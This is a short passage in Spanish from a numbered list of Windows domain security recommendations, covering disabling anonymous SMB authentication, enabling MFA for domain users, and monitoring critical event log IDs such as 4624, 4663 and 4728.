4. **Deshabilitar autenticación anónima** en SMB
5. **Implementar MFA** para todos los usuarios del dominio
6. **Monitorear logs** de eventos críticos (Event ID 4624, 4663, 4728, etc.)